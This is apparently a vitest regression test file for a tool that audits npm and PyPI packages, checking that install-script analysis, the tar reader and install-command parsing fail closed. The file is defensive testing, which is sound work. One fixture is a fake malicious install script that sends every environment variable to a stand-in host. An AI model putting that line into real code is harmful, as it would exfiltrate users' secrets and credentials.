import { gzipSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import { readTarGz } from "./analyze/tar.js";
import { checkPackage } from "./check.js";
import { buildTopList } from "./similarity/index.js";
import { MemoryCache } from "./sources/cache.js";
import { fetchBytes, SourceError, type FetchLike } from "./sources/http.js";
import { npmSource, type NpmPackageInfo, type NpmSource } from "./sources/npm.js";
import type { OsvSource } from "./sources/osv.js";
import { pypiSource, type PypiPackageInfo, type PypiSource } from "./sources/pypi.js";
import { daysAgo, makeTgz, NOW } from "./test/helpers.js";

/** Regression tests for fail-open paths found in the core audit. */
const tops = { npm: buildTopList("npm", ["react"]), pypi: buildTopList("pypi", ["requests"]) };
const osvClean: OsvSource = { query: async () => ({ malicious: [], vulns: [] }) };
const pypiNone: PypiSource = { project: async () => null, weeklyDownloads: async () => 0, sdist: async () => null };

const info = (tarball: string | undefined, integrity: string): NpmPackageInfo => ({
  name: "pkg-x",
  created: daysAgo(400),
  distTags: { latest: "1.0.0" },
  versions: {
    "1.0.0": {
      version: "1.0.0",
      time: daysAgo(300),
      maintainers: ["m"],
      provenance: false,
      scripts: { postinstall: "node install.js" },
      gypfile: false,
      integrity,
      repositoryUrl: "git+https://github.com/m/pkg-x.git",
      ...(tarball ? { tarball } : {}),
    },
  },
});
const npmFake = (pk: NpmPackageInfo, tgz: Record<string, Uint8Array>): NpmSource => ({
  packument: async () => pk,
  weeklyDownloads: async () => 5000,
  tarball: async (u) => tgz[u] ?? null,
});
const deps = (npm: NpmSource, extra: object = {}) => ({ npm, pypi: pypiNone, osv: osvClean, topLists: tops, now: () => NOW, ...extra });

describe("install-script analysis fails closed", () => {
  it("cache is keyed by tarball, not just name@version (same version on another registry)", async () => {
    const cache = new MemoryCache();
    const benign = makeTgz({ "package/install.js": "console.log('hi')" });
    const evil = makeTgz({ "package/install.js": "require('https').get('https://x.example/'+JSON.stringify(process.env))" });
    const a = await checkPackage({ ecosystem: "npm", name: "pkg-x" }, deps(npmFake(info("https://registry.npmjs.org/x.tgz", "sha512-a"), { "https://registry.npmjs.org/x.tgz": benign }), { cache }));
    expect(a.hits.map((h) => h.id)).not.toContain("R09");
    const b = await checkPackage({ ecosystem: "npm", name: "pkg-x" }, deps(npmFake(info("http://evil.example/x.tgz", "sha512-b"), { "http://evil.example/x.tgz": evil }), { cache }));
    expect(b.hits.map((h) => h.id)).toEqual(expect.arrayContaining(["R09", "R10"]));
  });

  it("install scripts + tarball 404 → E01 (was: silently unanalysed)", async () => {
    const r = await checkPackage({ ecosystem: "npm", name: "pkg-x" }, deps(npmFake(info("t://missing", "sha512-c"), {})));
    expect(r.hits.map((h) => h.id)).toContain("E01");
    expect(r.verdict).toBe("hold");
  });

  it("install scripts + no tarball URL → E01", async () => {
    const r = await checkPackage({ ecosystem: "npm", name: "pkg-x" }, deps(npmFake(info(undefined, "sha512-d"), {})));
    expect(r.hits.map((h) => h.id)).toContain("E01");
  });

  it("explicitly disabling analysis is not an error", async () => {
    const r = await checkPackage({ ecosystem: "npm", name: "pkg-x" }, deps(npmFake(info("t://missing", "sha512-e"), {})), { analyzeScripts: false });
    expect(r.hits.map((h) => h.id)).not.toContain("E01");
  });

  it("PyPI sdist-only release whose sdist can't be analysed → E01", async () => {
    const proj: PypiPackageInfo = {
      name: "sdist-only",
      latest: "1.0",
      created: daysAgo(400),
      repositoryUrl: "https://github.com/a/sdist-only",
      releases: { "1.0": { version: "1.0", time: daysAgo(300), hasWheel: false, sdistUrl: "t://sdist" } },
    };
    const pypi: PypiSource = { project: async () => proj, weeklyDownloads: async () => 5000, sdist: async () => null };
    const r = await checkPackage({ ecosystem: "pypi", name: "sdist-only" }, deps(npmFake(info("t://x", "i"), {}), { pypi }));
    expect(r.hits.map((h) => h.id)).toContain("E01");
  });
});

describe("sources", () => {
  const json = (body: unknown): FetchLike => async () => new Response(JSON.stringify(body), { status: 200, headers: { "content-type": "application/json" } });

  it("an unreadable packument is a source error, not 'does not exist' (R01)", async () => {
    const npm = npmSource({ fetch: json({ unexpected: true }) });
    await expect(npm.packument("x")).rejects.toBeInstanceOf(SourceError);
    const r = await checkPackage({ ecosystem: "npm", name: "x" }, deps(npm));
    expect(r.evidence.exists).toBeNull();
    expect(r.hits[0]!.id).toBe("E01");
  });

  it("unreadable PyPI JSON is a source error", async () => {
    await expect(pypiSource({ fetch: json({ nope: 1 }) }).project("x")).rejects.toBeInstanceOf(SourceError);
  });

  it("fetchBytes enforces the cap while streaming (no content-length)", async () => {
    const big = new Uint8Array(64 * 1024);
    const f: FetchLike = async () =>
      new Response(
        new ReadableStream<Uint8Array>({
          pull(c) {
            c.enqueue(big);
          },
        }),
        { status: 200 },
      );
    await expect(fetchBytes("t", "https://x.example/a.tgz", 256 * 1024, { fetch: f })).rejects.toThrow(/too large/);
    const small: FetchLike = async () => new Response(new Uint8Array([1, 2, 3]), { status: 200 });
    expect(await fetchBytes("t", "https://x.example/a.tgz", 10, { fetch: small })).toEqual(new Uint8Array([1, 2, 3]));
  });
});

describe("tar reader does not stop silently on headers it can't read", () => {
  const header = (path: string, sizeField: (h: Buffer) => void, type = "0") => {
    const h = Buffer.alloc(512);
    h.write(path, 0, 100);
    h.write("0000644\0", 100);
    sizeField(h);
    h.write("        ", 148);
    h.write(type, 156);
    h.write("ustar\0", 257);
    h.write("00", 263);
    let sum = 0;
    for (const b of h) sum += b;
    h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
    return h;
  };
  const pad = (n: number) => Buffer.alloc((512 - (n % 512)) % 512);

  it("throws on a corrupt header instead of returning the files before it", () => {
    expect(readTarGz(makeTgz({ "package/a.js": "1" }), () => true)).toHaveLength(1);
    const junk = Buffer.alloc(512, 0x41);
    expect(() => readTarGz(gzipSync(Buffer.concat([junk, Buffer.alloc(1024)])), () => true)).toThrow(/corrupt tar header/);
  });

  it("reads GNU base-256 sizes", () => {
    const data = Buffer.from("console.log(process.env)");
    const h = header("package/install.js", (b) => {
      b[124] = 0x80;
      b.writeUInt32BE(data.length, 132);
    });
    const files = readTarGz(gzipSync(Buffer.concat([h, data, pad(data.length), Buffer.alloc(1024)])), () => true);
    expect(files.map((f) => [f.path, Buffer.from(f.data).toString()])).toEqual([["package/install.js", "console.log(process.env)"]]);
  });

  it("honours pax size= overrides", () => {
    const data = Buffer.from("x".repeat(700));
    const rec = `${"16 size=700\n".length} size=700\n`;
    const pax = header("PaxHeader", (b) => b.write(rec.length.toString(8).padStart(11, "0") + "\0", 124), "x");
    const file = header("package/big.js", (b) => b.write("00000000000\0", 124));
    const tar = Buffer.concat([pax, Buffer.from(rec), pad(rec.length), file, data, pad(data.length), Buffer.alloc(1024)]);
    const files = readTarGz(gzipSync(tar), () => true);
    expect(files.map((f) => [f.path, f.data.length])).toEqual([["package/big.js", 700]]);
  });
});

describe("npm config overrides and in-repo deps", async () => {
  const { parseInstallCommand, parsePackageJsonDeps } = await import("./parse/command.js");
  it("--userconfig / --globalconfig are flagged unverifiable (they can change the registry)", () => {
    const p = parseInstallCommand("npm i lodash --userconfig ./evil.npmrc")[0];
    expect(p?.nonRegistry.join()).toMatch(/--userconfig/);
  });
  it("workspace:/link:/portal: deps are in-repo, not flagged", () => {
    const r = parsePackageJsonDeps({ dependencies: { a: "workspace:*", b: "link:../b", c: "portal:../c", d: "github:x/y", e: "^1.0.0" } });
    expect(r.nonRegistry).toEqual(["d@github:x/y"]);
    expect(r.targets.map((t) => t.name)).toEqual(["e"]);
  });
});

describe("brace expansion", async () => {
  const { parseInstallCommand } = await import("./parse/command.js");
  const { expandBraces } = await import("./parse/shell.js");
  it("expands like bash", () => {
    expect(expandBraces("{a,b}")).toEqual(["a", "b"]);
    expect(expandBraces("x{a,b{c,d}}y")).toEqual(["xay", "xbcy", "xbdy"]);
    expect(expandBraces("p{1..3}")).toEqual(["p1", "p2", "p3"]);
    expect(expandBraces("{x}")).toEqual(["{x}"]);
    expect(expandBraces("{1..100000}")).toEqual(["{1..100000}"]);
  });
  it("every expanded package is checked by name", () => {
    const p = parseInstallCommand("npm i {color-fn-utils,lodash}")[0]!;
    expect(p.targets.map((t) => t.name)).toEqual(["color-fn-utils", "lodash"]);
    expect(p.nonRegistry).toEqual([]);
  });
});
